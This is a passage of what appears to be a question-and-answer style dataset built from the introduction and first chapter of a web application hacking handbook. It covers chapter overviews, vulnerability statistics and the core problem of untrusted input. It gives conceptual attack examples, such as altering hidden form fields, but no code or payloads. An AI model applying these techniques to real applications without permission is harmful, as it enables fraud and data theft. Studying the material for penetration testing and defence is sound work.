specific steps that you need to take to detect each type of vulnerability, and\nhow to exploit it to perform unauthorized actions. We also include a wealth of\nreal-world examples, derived from the authors’ many years of experience, illus-\ntrating how different kinds of security flaw manifest themselves in today’s web\napplications.\nSecurity awareness is usually a two-edged sword. Just as application devel-\nopers can benefit from understanding the methods used by attackers, hackers\nxxv"
  },
  {
    "input": "How This Book Is Organized",
    "output": "70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxvi\nxxvi Introduction\ncan gain from knowing how applications can effectively defend themselves. In\naddition to describing security vulnerabilities and attack techniques, we also\ndescribe in detail the countermeasures that applications can take to thwart an\nattacker. For those of you who perform penetration tests of web applications,\nthis will enable you to provide high-quality remediation advice to the owners\nof the applications you compromise.\nWho Should Read This Book\nThe primary audience for this book is anyone with a personal or professional\ninterest in attacking web applications. It is also aimed at anyone responsible\nfor developing and administering web applications—knowing how your\nenemy operates will help you to defend against them.\nWe assume that the reader is familiar with core security concepts, such as\nlogins and access controls, and has a basic grasp of core web technologies,\nsuch as browsers, web servers, and HTTP. However, any gaps in your current\nknowledge of these areas will be easy to remedy, through either the explana-\ntions contained within this book or references elsewhere.\nIn the course of illustrating many categories of security flaws, we provide\ncode extracts showing how applications can be vulnerable. These examples\nare simple enough to be understood without any prior knowledge of the lan-\nguage in question but will be most useful if you have some basic experience of\nreading or writing code.\nHow This Book Is Organized\nThis book is organized roughly in line with the dependencies between the dif-\nferent topics covered. If you are new to web application hacking, you should\nread the book through from start to finish, acquiring the knowledge and under-\nstanding you need to tackle later chapters. If you already have some experience\nin this area, you can jump straight into any chapter or subsection that particu-\nlarly interests you. Where necessary, we have included cross-references to other\nchapters, which you can use to fill in any gaps in your understanding.\nWe begin with three context-setting chapters describing the current state of\nweb application security and the trends that indicate how it is likely to evolve\nin the near future. We examine the core security problem affecting web appli-\ncations and the defense mechanisms that applications implement to address\nthis problem. We also provide a primer in the key technologies used in today’s\nweb applications.\nThe bulk of the book is concerned with our core topic—the techniques that\nyou can use to break into web applications. This material is organized around\n70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxvii\nIntroduction xxvii\nthe key tasks that you need to perform to carry out a comprehensive attack:\nfrom mapping the application’s functionality, scrutinizing and attacking its\ncore defense mechanisms, to probing for specific categories of security flaws.\nThe book concludes with three chapters that pull together the various\nstrands introduced within the book. We describe the process of finding vul-\nnerabilities in an application’s source code, review the tools that can assist you\nwhen hacking web applications, and present a detailed methodology for per-\nforming a comprehensive and deep attack against a specific target.\nChapter 1, “Web Application (In)security,” describes the current state of\nsecurity in web applications on the Internet today. Despite common assur-\nances, the majority of applications are insecure and can be compromised in\nsome way with a modest degree of skill. Vulnerabilities in web applications\narise because of a single core problem: users can submit arbitrary input. In this\nchapter, we examine the key factors that contribute to the weak security pos-\nture of today’s applications, and describe how defects in web applications can\nleave an organization’s wider technical infrastructure highly vulnerable to\nattack.\nChapter 2, “Core Defense Mechanisms,” describes the key security mecha-\nnisms that web applications employ to address the fundamental problem that\nall user input is untrusted. These mechanisms are the means by which an\napplication manages user access, handles user input, and responds to attack-\ners, and the functions provided for administrators to manage and monitor the\napplication itself. The application’s core security mechanisms also represent\nits primary attack surface, and you need to understand how these mechanisms\nare intended to function before you can effectively attack them.\nChapter 3, “Web Application Technologies,” provides a short primer on the\nkey technologies that you are likely to encounter when attacking web applica-\ntions. This covers all relevant aspects of the HTTP protocol, the technologies\ncommonly used on the client and server sides, and various schemes used for\nencoding data. If you are already familiar with the main web technologies,\nthen you can quickly skim through this chapter.\nChapter 4, “Mapping the Application,” describes the first exercise that you\nneed to take when targeting a new application, which is to gather as much\ninformation as possible about it, in order to map its attack surface and formu-\nlate your plan of attack. This process includes exploring and probing the appli-\ncation to catalogue all of its content and functionality, identifying all of the\nentry points for user input and discovering the technologies in use.\nChapter 5, “Bypassing Client-Side Controls,” describes the first area of\nactual vulnerability, which arises when an application relies upon controls\nimplemented on the client side for its security. This approach is normally\nflawed, because any client-side controls can, of course, be circumvented. The\ntwo main ways in which applications make themselves vulnerable are (a) to\ntransmit data via the client in the assumption that this will not be modified,\n70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxviii\nxxviii Introduction\nand (b) to rely upon client-side checks on user input. In this chapter, we exam-\nine a range of interesting technologies, including lightweight controls imple-\nmented within HTML, HTTP, and JavaScript, and more heavyweight controls\nusing Java applets, ActiveX controls, and Shockwave Flash objects.\nChapters 6 to 8 examine some of the most important defense mechanisms\nimplemented within web applications: those responsible for controlling user\naccess. Chapter 6, “Attacking Authentication,” examines the various functions\nby which applications gain assurance of the identity of their users. This\nincludes the main login function and also the more peripheral authentication-\nrelated functions such as user registration, password changing, and account\nrecovery. Authentication mechanisms contain a wealth of different vulnerabil-\nities, in both design and implementation, which an attacker can leverage to\ngain unauthorized access. These range from obvious defects, such as bad pass-\nwords and susceptibility to brute-force attacks, to more obscure problems\nwithin the authentication logic. We also examine in detail the type of multi-\nstage login mechanisms used in many security-critical applications, and\ndescribe the new kinds of vulnerability which these frequently contain.\nChapter 7, “Attacking Session Management,” examines the mechanism by\nwhich most applications supplement the stateless HTTP protocol with the con-\ncept of a stateful session, enabling them to uniquely identify each user across\nseveral different requests. This mechanism is a key target when you are attack-\ning a web application, because if you can break it, then you can effectively\nbypass the login and masquerade as other users without knowing their cre-\ndentials. We look at various common defects in the generation and transmis-\nsion of session tokens, and describe the steps you can take to discover and\nexploit these.\nChapter 8, “Attacking Access Controls,” examines the ways in which appli-\ncations actually enforce access controls, relying upon the authentication and\nsession management mechanisms to do so. We describe various ways in which\naccess controls can be broken and the ways in which you can detect and\nexploit these weaknesses.\nChapter 9, “Injecting Code,” covers a large category of related vulnerabili-\nties, which arise when applications embed user input into interpreted code in\nan unsafe way. We begin with a detailed examination of SQL injection vulner-\nabilities, covering the full range of attacks from the most obvious and trivial to\nadvanced exploitation techniques involving out-of-band channels, inference,\nand time delays. For each kind of vulnerability and attack technique, we\ndescribe the relevant differences between three common types of databases:\nMS-SQL, Oracle, and MySQL. We then cover several other categories of injec-\ntion vulnerability, including the injection of operating system commands,\ninjection into web scripting languages, and injection into the SOAP, XPath,\nSMTP, and LDAP protocols.\n70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxix\nIntroduction xxix\nChapter 10, “Exploiting Path Traversal,” examines a small but important\ncategory of vulnerabilities that arise when user input is passed to file system\nAPIs in an unsafe way, enabling an attacker to retrieve or modify arbitrary\nfiles on the web server. We describe various bypasses that may be effective\nagainst the defenses commonly implemented to prevent path traversal\nattacks.\nChapter 11, “Attacking Application Logic,” examines a significant, and fre-\nquently overlooked, area of every application’s attack surface: the internal\nlogic which it carries out to implement its functionality. Defects in an applica-\ntion’s logic are extremely varied and are harder to characterize than common\nvulnerabilities like SQL injection and cross-site scripting. For this reason, we\npresent a series of real-world examples where defective logic has left an appli-\ncation vulnerable, and thereby illustrate the variety of faulty assumptions\nmade by application designers and developers. From these different individ-\nual flaws, we w derive a series of specific tests that you can perform to locate\nmany types of logic flaws that often go undetected.\nChapter 12, “Attacking Other Users,” covers a large and very topical area of\nrelated vulnerabilities which arise when defects within a web application can\nenable a malicious user of the application to attack other users and compro-\nmise them in various ways. The largest vulnerability of this kind is cross-site\nscripting, a hugely prevalent flaw affecting the vast majority of web applica-\ntions on the Internet. We examine in detail all of the different flavors of XSS\nvulnerabilities, and describe an effective methodology for detecting and\nexploiting even the most obscure manifestations of these. We then look at sev-\neral other types of attacks against other users, including redirection attacks,\nHTTP header injection, frame injection, cross-site request forgery, session fixa-\ntion, exploiting bugs in ActiveX controls, and local privacy attacks.\nChapter 13, “Automating Bespoke Attacks,” does not introduce any new\ncategories of vulnerability, but instead, describes a crucial technique which\nyou need to master to attack web applications effectively. Because every web\napplication is different, most attacks are bespoke (or custom-made) in some\nway, tailored to the application’s specific behavior and the ways you have dis-\ncovered to manipulate it to your advantage. They also frequently require issu-\ning a large number of similar requests and monitoring the application’s\nresponses. Performing these requests manually is extremely laborious and one\nis prone to make mistakes. To become a truly accomplished web application\nhacker, you need to automate as much of this work as possible, to make your\nbespoke attacks easier, faster, and more effective. In this chapter, we describe\nin detail a proven methodology for achieving this.\nChapter 14, “Exploiting Information Disclosure,” examines various ways in\nwhich applications leak information when under active attack. When you are\nperforming all of the other types of attacks described in this book, you should\nalways monitor the application to identify further sources of information\n70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxx\nxxx Introduction\ndisclosure that you can exploit. We describe how you can investigate anom-\nalous behavior and error messages to gain a deeper understanding of the\napplication’s internal workings and fine-tune your attack. We also cover ways\nof manipulating defective error handling to systematically retrieve sensitive\ninformation from the application.\nChapter 15, “Attacking Compiled Applications,” examines a set of impor-\ntant vulnerabilities which arise in applications written in native code lan-\nguages like C and C++. These vulnerabilities include buffer overflows, integer\nvulnerabilities, and format string flaws. This is a potentially huge topic, and\nwe focus on ways of detecting these vulnerabilities in web applications, and\nlook at some real-world examples of how these have arisen and been\nexploited.\nChapter 16, “Attacking Application Architecture,” examines an important\narea of web application security that is frequently overlooked. Many applica-\ntions employ a tiered architecture, and a failure to segregate different tiers\nproperly often leaves an application vulnerable, enabling an attacker who has\nfound a defect in one component to quickly compromise the entire applica-\ntion. A different range of threats arises in shared hosting environments, where\ndefects or malicious code in one application can sometimes be exploited to\ncompromise the environment itself and other applications running within it.\nChapter 17, “Attacking the Web Server,” describes various ways in which\nyou can target a web application by targeting the web server on which it is\nrunning. Vulnerabilities in web servers are broadly composed of defects in\ntheir configuration and security flaws within the web server software. This\ntopic is on the boundary of the scope of this book, because the web server is\nstrictly a different component in the technology stack. However, most web\napplications are intimately bound up with the web server on which they run;\ntherefore, attacks against the web server are included in the book because they\ncan often be used to compromise an application directly, rather than indirectly\nby first compromising the underlying host.\nChapter 18, “Finding Vulnerabilities in Source Code,” describes a com-\npletely different approach to finding security flaws than those described else-\nwhere within this book. There are many situations in which it may be possible\nto perform a review of an application’s source code, not all of which require\nany cooperation from the application’s owner. Reviewing an application’s\nsource code can often be highly effective in discovering vulnerabilities that\nwould be difficult or time-consuming to detect by probing the running appli-\ncation. We describe a methodology, and provide a language-by-language cheat\nsheet, to enable you to perform an effective code review even if you have very\nlimited programming experience yourself.\nChapter 19, “A Web Application Hacker’s Toolkit,” pulls together in one place\nthe various tools described in the course of this book, and which the authors use\nwhen attacking real-world web applications. We describe the strengths and"
  },
  {
    "input": "What's on the Web Site",
    "output": "70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxxi\nIntroduction xxxi\nweaknesses of different tools, explain the extent to which any fully automated\ntool can be effective in finding web application vulnerabilities, and provide\nsome tips and advice for getting the most out of your toolkit.\nChapter 20, “A Web Application Hacker’s Methodology,” contains a com-\nprehensive and structured collation of all the procedures and techniques\ndescribed in this book. These are organized and ordered according to the logi-\ncal dependencies between tasks when you are carrying out an actual attack. If\nyou have read and understood all of the vulnerabilities and techniques\ndescribed in this book, you can use this methodology as a complete checklist\nand work plan when carrying out an attack against a web application.\nTools You Will Need\nThis book is strongly geared towards the hands-on techniques that you can use\nto attack web applications. After reading the book, you will understand the\nspecifics of each individual task, what it involves technically, and why it works\nin helping you detect and exploit vulnerabilities. The book is emphatically not\nabout downloading some tool, pointing it at a target application, and believing\nwhat the tool’s output tells you about the state of the application’s security.\nThat said, there are several tools which you will find useful, and sometimes\nindispensable, when performing the tasks and techniques that we describe. All\nof these are easily available on the Internet, and we recommended that you\ndownload and experiment with each tool at the point where it appears in the\ncourse of the book.\nWhat's on the Web Site\nThe companion web site for this book at www.wiley.com/go/webhacker con-\ntains several resources that you will find useful in the course of mastering the\ntechniques we describe and using them to attack actual applications. In partic-\nular, the web site contains the following:\n■■ Source code to some of the scripts we present in the book.\n■■ A list of current links to all of the tools and other resources discussed in\nthe book.\n■■ A handy checklist of the tasks involved in attacking a typical application.\n■■ Answers to the questions posed at the end of each chapter.\n■■ A hacking challenge containing many of the vulnerabilities described in\nthe book."
  },
  {
    "input": "Bring It On",
    "output": "70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxxii\nxxxii Introduction\nBring It On\nWeb application security is a fun and thriving subject. We enjoyed writing this\nbook as much as we continue to enjoy hacking into web applications on a daily\nbasis. We hope that you will also take pleasure from learning about the differ-\nent techniques we describe and how these can be defended against.\nBefore going any further, we should mention an important caveat. In most\ncountries, attacking computer systems without the owner’s permission is\nagainst the law. The majority of the techniques we describe are illegal if carried\nout without consent.\nThe authors are professional penetration testers who routinely attack web\napplications on behalf of clients, to help them improve their security. In recent\nyears, numerous security professionals and others have acquired criminal\nrecords, and ended their careers, by experimenting on or actively attacking\ncomputer systems without permission. We urge you to use the information\ncontained in this book only for lawful purposes."
  },
  {
    "input": "Chapter 1: Web Application (In)security",
    "output": "70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 1\nCHAPTER\n1\nWeb Application (In)security\nThere is no doubt that web application security is a current and very news-\nworthy subject. For all concerned, the stakes are high: for businesses that\nderive increasing revenue from Internet commerce, for users who trust web\napplications with sensitive information, and for criminals who can make big\nmoney by stealing payment details or compromising bank accounts. Reputa-\ntion plays a critical role: few people want to do business with an insecure web\nsite, and so few organizations want to disclose details about their own security\nvulnerabilities or breaches. Hence, it is not trivial to obtain reliable informa-\ntion about the state of web application security today.\nThis chapter takes a brief look at how web applications have evolved and the\nmany benefits they provide. We present some metrics about vulnerabilities in\ncurrent web applications, drawn from the authors’ direct experience, demon-\nstrating that the majority of applications are far from secure. We describe the\ncore security problem facing web applications—that users can supply arbi-\ntrary input—and the various factors that contribute to their weak security pos-\nture. Finally, we describe the latest trends in web application security and the\nways in which these may be expected to develop in the near future.\n1"
  },
  {
    "input": "The Evolution of Web Applications",
    "output": "70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 2\n2 Chapter 1 ■ Web Application (In)security\nThe Evolution of Web Applications\nIn the early days of the Internet, the World Wide Web consisted only of web sites.\nThese were essentially information repositories containing static documents,\nand web browsers were invented as a means of retrieving and displaying those\ndocuments, as shown in Figure1-1. The flow of interesting information was one-\nway, from server to browser. Most sites did not authenticate users, because there\nwas no need to—each user was treated in the same way and presented with the\nsame information. Any security threats arising from hosting a web site related\nlargely to vulnerabilities in web server software (of which there were many). If\nan attacker compromised a web server, he would not normally gain access to\nany sensitive information, because the information held on the server was\nalready open to public view. Rather, an attacker would typically modify the files\non the server to deface the web site’s contents, or use the server’s storage and\nbandwidth to distribute “warez.”\nFigure 1-1: A traditional web site containing static information\nToday, the World Wide Web is almost unrecognizable from its earlier form.\nThe majority of sites on the web are in fact applications (see Figure1-2). They\nare highly functional, and rely upon two-way flow of information between the\nserver and browser. They support registration and login, financial transactions,\nsearch, and the authoring of content by users. The content presented to users is\ngenerated dynamically on the fly, and is often tailored to each specific user.\nMuch of the information processed is private and highly sensitive. Security is\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 3\nChapter 1 ■ Web Application (In)security 3\ntherefore a big issue: no one wants to use a web application if they believe their\ninformation will be disclosed to unauthorized parties.\nWeb applications bring with them new and significant security threats. Each\napplication is different and may contain unique vulnerabilities. Most applica-\ntions are developed in-house, and many by developers who have little under-\nstanding of the security problems that may arise in the code they are\nproducing. To deliver their core functionality, web applications normally\nrequire connectivity to internal computer systems that contain highly sensitive\ndata and are able to perform powerful business functions. Ten years ago, if you\nwanted to make a funds transfer, you visited your bank and someone per-\nformed it for you; today, you can visit their web application and perform it\nyourself. An attacker who compromises a web application may be able to steal\npersonal information, carry out financial fraud, and perform malicious actions\nagainst other users.\nFigure 1-2 A typical web application\nCommon Web Application Functions\nWeb applications have been created to perform practically every useful func-\ntion one could possibly implement online. Examples of web application func-\ntions that have risen to prominence in recent years include:\n■■ Shopping (Amazon)\n■■ Social networking (MySpace)\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 4\n4 Chapter 1 ■ Web Application (In)security\n■■ Banking (Citibank)\n■■ Web search (Google)\n■■ Auctions (eBay)\n■■ Gambling (Betfair)\n■■ Web logs (Blogger)\n■■ Web mail (Hotmail)\n■■ Interactive information (Wikipedia)\nIn addition to the public Internet, web applications have been widely\nadopted inside organizations to perform key business functions, including\naccessing HR services and managing company resources. They are also fre-\nquently used to provide an administrative interface to hardware devices such\nas printers, and other software such as web servers and intrusion detection\nsystems.\nNumerous applications that predated the rise of web applications have been\nmigrated to this technology. Business applications like enterprise resource\nplanning (ERP) software, which were previously accessed using a proprietary\nthick-client application, can now be accessed using a web browser. Software\nservices such as email, which originally required a separate email client, can\nnow be accessed via web interfaces like Outlook Web Access. This trend is con-\ntinuing as traditional desktop office applications such as word processors and\nspreadsheets are migrated to web applications, through services like Google\nApps and Microsoft Office Live.\nThe time is fast approaching when the only client software that most com-\nputer users will need is a web browser. A hugely diverse range of functions\nwill have been implemented using a shared set of protocols and technologies,\nand in so doing will have inherited a distinctive range of common security\nvulnerabilities.\nBenefits of Web Applications\nIt is not difficult to see why web applications have enjoyed such a dramatic\nrise to prominence. Several technical factors have worked alongside the obvi-\nous commercial incentives to drive the revolution that has occurred in the way\nwe use the Internet:\n■■ HTTP, the core communications protocol used to access the World Wide\nWeb, is lightweight and connectionless. This provides resilience in the\nevent of communication errors and avoids the need for the server to\nhold open a network connection to every user as was the case in many"
  },
  {
    "input": "Web Application Security",
    "output": "70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 5\nChapter 1 ■ Web Application (In)security 5\nlegacy client-server applications. HTTP can also be proxied and tun-\nneled over other protocols, allowing for secure communication in any\nnetwork configuration.\n■■ Every web user already has a browser installed on their computer.\nWeb applications deploy their user interface dynamically to the\nbrowser, avoiding the need to distribute and manage separate client\nsoftware, as was the case with pre-web applications. Changes to the\ninterface only need to be implemented once, on the server, and take\neffect immediately.\n■■ Today’s browsers are highly functional, enabling rich and satisfying\nuser interfaces to be built. Web interfaces use standard navigational and\ninput controls that are immediately familiar to users, avoiding the need\nto learn how each individual application functions. Client-side scripting\nenables applications to push part of their processing to the client side,\nand browsers’ capabilities can be extended in arbitrary ways using\nthick-client components where necessary.\n■■ The core technologies and languages used to develop web applications\nare relatively simple. A wide range of platforms and development tools\nare available to facilitate the development of powerful applications by\nrelative beginners, and a large quantity of open source code and other\nresources is available for incorporation into custom-built applications.\nWeb Application Security\nAs with any new class of technology, web applications have brought with\nthem a new range of security vulnerabilities. The set of most commonly\nencountered defects has evolved somewhat over time. New attacks have been\nconceived that were not considered when existing applications were devel-\noped. Some problems have become less prevalent as awareness of them has\nincreased. New technologies have been developed that have introduced new\npossibilities for exploitation. Some categories of flaws have largely gone away\nas the result of changes made to web browser software.\nThroughout this evolution, compromises of prominent web applications\nhave remained in the news, and there is no sense that a corner has been turned\nand that these security problems are on the wane. Arguably, web application\nsecurity is today the most significant battleground between attackers and\nthose with computer resources and data to defend, and it is likely to remain so\nfor the foreseeable future.\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 6\n6 Chapter 1 ■ Web Application (In)security\n“This Site Is Secure”\nThere is a widespread awareness that security is an “issue” for web applica-\ntions. Consult the FAQ page of a typical application, and you will be reassured\nthat it is in fact secure. For example:\nThis site is absolutely secure. It has been designed to use 128-bit Secure Socket\nLayer (SSL) technology to prevent unauthorized users from viewing any of your\ninformation. You may use this site with peace of mind that your data is safe with us.\nIn virtually every case, web applications state that they are secure because\nthey use SSL. Users are often urged to verify the site’s certificate, admire the\nadvanced cryptographic protocols in use, and on this basis, trust it with their\npersonal information.\nIn fact, the majority of web applications are insecure, and in ways that have\nnothing to do with SSL. The authors of this book have tested hundreds of web\napplications in recent years. Figure 1-3 shows the proportions of those appli-\ncations tested during 2006 and 2007 that were found to be affected by some\ncommon categories of vulnerability. These are explained briefly below:\n■■ Broken authentication (67%) — This category of vulnerability encom-\npasses various defects within the application’s login mechanism, which\nmay enable an attacker to guess weak passwords, launch a brute-force\nattack, or bypass the login altogether.\n■■ Broken access controls (78%) — This involves cases where the appli-\ncation fails to properly protect access to its data and functionality,\npotentially enabling an attacker to view other users’ sensitive data held\non the server, or carry out privileged actions.\n■■ SQL injection (36%) — This vulnerability enables an attacker to sub-\nmit crafted input to interfere with the application’s interaction with\nback-end databases. An attacker may be able to retrieve arbitrary data\nfrom the application, interfere with its logic, or execute commands on\nthe database server itself.\n■■ Cross-site scripting (91%) — This vulnerability enables an attacker to\ntarget other users of the application, potentially gaining access to their\ndata, performing unauthorized actions on their behalf, or carrying out\nother attacks against them.\n■■ Information leakage (81%) — This involves cases where an applica-\ntion divulges sensitive information that is of use to an attacker in devel-\noping an assault against the application, through defective error\nhandling or other behavior.\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 7\nChapter 1 ■ Web Application (In)security 7\nBroken authentication 67%\nBroken access controls 78%\nSQL injection 36%\nCross-site scripting 91%\nInformation leakage 81%\n0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100%\nIncidence in recently tested applications\nFigure 1-3 The incidence of some common web application vulnerabilities in\napplications recently tested by the authors (based on a sample of more than 100)\nSSL is an excellent technology that protects the confidentiality and integrity\nof data in transit between the user’s browser and the web server. It helps to\ndefend against eavesdroppers, and it can provide assurance to the user of the\nidentity of the web server they are dealing with. But it does not stop attacks\nthat directly target the server or client components of an application, as most\nsuccessful attacks do. Specifically, it does not prevent any of the vulnerabilities\nlisted previously, or many others that can render an application critically\nexposed to attack. Regardless of whether or not they use SSL, most web appli-\ncations still contain security flaws.\nNOTE Although SSL has nothing to do with the majority of web application\nvulnerabilities, do not infer that it is unnecessary to an application’s security.\nProperly used, SSL provides an effective defense against several important\nattacks. An occasional mistake by developers is to eschew industry-standard\ncryptography in favor of a home-grown solution, which as a rule is more\nexpensive and less effective. Consider the following (actual) FAQ answer, which\nrings even louder alarm bells than the orthodox wisdom described previously:\nThis site is secure. For your safety (and our peace of mind) we do not use\n“standard” security procedures such as SSL but proprietary protocols which we\nwon’t disclose in detail here but permit immediate transfer of any data you\nsubmit to a completely secure location. In other words the data never stays on\na server “floating in cyberspace,” which allows us to keep potential\nmalfeasants in the dark.\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 8\n8 Chapter 1 ■ Web Application (In)security\nThe Core Security Problem:\nUsers Can Submit Arbitrary Input\nAs with most distributed applications, web applications face a fundamental\nproblem which they must address in order to be secure. Because the client is\noutside of the application’s control, users can submit completely arbitrary\ninput to the server-side application. The application must assume that all input\nis potentially malicious, and must take steps to ensure that attackers cannot use\ncrafted input to compromise the application by interfering with its logic and\nbehavior and gaining unauthorized access to its data and functionality.\nThis core problem manifests itself in various ways:\n■■ Users can interfere with any piece of data transmitted between the\nclient and the server, including request parameters, cookies, and HTTP\nheaders. Any security controls implemented on the client side, such as\ninput validation checks, can be easily circumvented.\n■■ Users can send requests in any sequence, and can submit parameters at\na different stage than the application expects, more than once, or not at\nall. Any assumption which developers make about how users will\ninteract with the application may be violated.\n■■ Users are not restricted to using only a web browser to access the appli-\ncation. There are numerous widely available tools that operate along-\nside, or independently of, a browser, to help attack web applications.\nThese tools can make requests that no browser would ordinarily make,\nand can generate huge numbers of requests quickly to find and exploit\nproblems.\nThe majority of attacks against web applications involve sending input to\nthe server which is crafted to cause some event that was not expected or\ndesired by the application’s designer. Some examples of submitting crafted\ninput to achieve this objective are as follows:\n■■ Changing the price of a product transmitted in a hidden HTML form\nfield, to fraudulently purchase the product for a cheaper amount.\n■■ Modifying a session token transmitted in an HTTP cookie, to hijack the\nsession of another authenticated user.\n■■ Removing certain parameters that are normally submitted, to exploit a\nlogic flaw in the application’s processing.\n■■ Altering some input that will be processed by a back-end database, to\ninject a malicious database query and so access sensitive data.\nNeedless to say, SSL does nothing to stop an attacker from submitting\ncrafted input to the server. If the application uses SSL, this simply means that\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 9\nChapter 1 ■ Web Application (In)security 9\nother users on the network cannot view or modify the attacker’s data in tran-\nsit. Because the attacker controls her end of the SSL tunnel, she can send any-\nthing she likes to the server through this tunnel. If any of the previously\nmentioned attacks are successful, then the application is emphatically vulner-\nable, regardless of what its FAQ may tell you.\nKey Problem Factors\nThe core security problem faced by web applications arises in any situation\nwhere an application must accept and process untrusted data that may be\nmalicious. However, in the case of web applications, there are several factors\nwhich have combined to exacerbate the problem, and which explain why\nso many web applications on the Internet today do such a poor job of address-\ning it.\nImmature Security Awareness\nThere is a less mature level of awareness of web application security issues\nthan there is in longer-established areas such as networks and operating sys-\ntems. While most people working in IT security have a reasonable grasp of the\nessentials of securing networks and hardening hosts, there is still widespread\nconfusion and misconception about many of the core concepts involved in\nweb application security. It is common to meet experienced web application\ndevelopers to whom an explanation of many basic types of flaws comes as a\ncomplete revelation.\nIn-House Development\nMost web applications are developed in-house by an organization’s own staff\nor contractors. Even where an application employs third-party components,\nthese are typically customized or bolted together using new code. In this situ-\nation, every application is different and may contain its own unique defects.\nThis stands in contrast to a typical infrastructure deployment in which an\norganization can purchase a best-of-breed product and install it in line with\nindustry-standard guidelines.\nDeceptive Simplicity\nWith today’s web application platforms and development tools, it is possible\nfor a novice programmer to create a powerful application from scratch in a\nshort period of time. But there is a huge difference between producing code\nthat is functional and code that is secure. Many web applications are created\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 10\n10 Chapter 1 ■ Web Application (In)security\nby well-meaning individuals who simply lack the knowledge and experience\nto identify where security problems may arise.\nRapidly Evolving Threat Profile\nAs a result of its relative immaturity, research into web application attacks and\ndefenses is a thriving area in which new concepts and threats are conceived at\na faster rate than is now the case for older technologies. A development team\nthat begins a project with a complete knowledge of current threats may well\nhave lost this status by the time the application is completed and deployed.\nResource and Time Constraints\nMost web application development projects are subject to strict constraints on\ntime and resources, arising from the economics of in-house, one-off develop-\nment. It is not usually possible to employ dedicated security expertise in the\ndesign or development teams, and due to project slippage security testing by\nspecialists is often left until very late in the project’s lifecycle. In the balancing\nof competing priorities, the need to produce a stable and functional applica-\ntion by a deadline normally overrides less tangible security considerations. A\ntypical small organization may be willing to pay for only a few man-days of\nconsulting time to evaluate a new application. A quick penetration test will\noften find the low-hanging fruit, but it may miss more subtle vulnerabilities\nthat require time and patience to identify.\nOverextended Technologies\nMany of the core technologies employed in web applications began life when\nthe landscape of the World Wide Web was very different, and have since been\npushed far beyond the purposes for which they were originally conceived—\nfor example, the use of JavaScript as a means of data transmission in many\nAJAX-based applications. As the expectations placed on web application func-\ntionality have rapidly evolved, the technologies used to implement this func-\ntionality have lagged behind the curve, with old technologies stretched and\nadapted to meet new requirements. Unsurprisingly, this has led to security\nvulnerabilities as unforeseen side effects emerge.\nThe New Security Perimeter\nBefore the rise of web applications, organizations’ efforts to secure themselves\nagainst external attack were largely focused on the network perimeter. Defend-\ning this perimeter entailed hardening and patching the services that it needed\nto expose, and firewalling access to others.\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 11\nChapter 1 ■ Web Application (In)security 11\nWeb applications have changed all of this. For an application to be accessi-\nble by its users, the perimeter firewall must allow inbound connections to the\nserver over HTTP/S. And for the application to function, the server must be\nallowed to connect to supporting back-end systems, such as databases, main-\nframes, and financial and logistical systems. These systems often lie at the core\nof the organization’s operations and reside behind several layers of network-\nlevel defenses.\nIf a vulnerability exists within a web application, then an attacker on the\npublic Internet may be able to compromise the organization’s core back-end\nsystems solely by submitting crafted data from his web browser. This data will\nsail past all of the organization’s network defenses, in just the same way as\ndoes ordinary, benign traffic to the web application.\nThe effect of widespread deployment of web applications is that the security\nperimeter of a typical organization has moved. Part of that perimeter is still\nembodied in firewalls and bastion hosts. But a significant part of it is now\noccupied by the organization’s web applications. Because of the manifold\nways in which web applications receive user input and pass this to sensitive\nback-end systems, they are the potential gateways for a wide range of attacks,\nand defenses against these attacks must be implemented within the applica-\ntions themselves. A single line of defective code in a single web application can\nrender an organization’s internal systems vulnerable. The statistics described\npreviously, of the incidence of vulnerabilities within this new security perime-\nter, should give every organization pause for thought.\nNOTE For an attacker targeting an organization, gaining access to the\nnetwork or executing arbitrary commands on servers may well not be what\nthey really want to achieve. Often, and perhaps typically, what an attacker\nreally desires is to perform some application-level action such as stealing\npersonal information, transferring funds, or making cheap purchases. And the\nrelocation of the security perimeter to the application layer may greatly assist\nan attacker in achieving these objectives.\nFor example, suppose that an attacker wishes to “hack in” to a bank’s systems\nand steal money from users’ accounts. Before the bank deployed a web\napplication, the attacker might have needed to find a vulnerability in a publicly\nreachable service, exploit this to gain a toehold on the bank’s DMZ, penetrate\nthe firewall restricting access to its internal systems, map the network to find\nthe mainframe computer, decipher the arcane protocol used to access it, and\nthen guess some credentials in order to log in. However, if the bank deploys a\nvulnerable web application, then the attacker may be able to achieve the same\noutcome simply by modifying an account number in a hidden field of an HTML\nform.\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 12\n12 Chapter 1 ■ Web Application (In)security\nA second way in which web applications have moved the security perime-\nter arises from the threats that users themselves face when they access a vul-\nnerable application. A malicious attacker can leverage a benign but vulnerable\nweb application to attack any user who visits it. If that user is located on an\ninternal corporate network, the attacker may harness the user’s browser to\nlaunch an attack against the local network from the user’s trusted position.\nWithout any cooperation from the user, the attacker may be able to carry out\nany action that the user could perform if she were herself malicious.\nNetwork administrators are familiar with the idea of preventing their users\nfrom visiting malicious web sites, and end users themselves are gradually\nbecoming more aware of this threat. But the nature of web application vulner-\nabilities means that a vulnerable application may present no less of a threat to\nits users and their organization than a web site that is overtly malicious. Cor-\nrespondingly, the new security perimeter imposes a duty of care on all appli-\ncation owners to protect their users from attacks against them delivered via\nthe application.\nThe Future of Web Application Security\nSeveral years after their widespread adoption, web applications on the Internet\ntoday are still rife with vulnerabilities. Understanding of the security threats\nfacing web applications, and effective ways of addressing these, remains imma-\nture within the industry. There is currently little indication that the problem fac-\ntors described previouslyare going to go away in the near future.\nThat said, the details of the web application security landscape are not sta-\ntic. While old and well understood vulnerabilities like 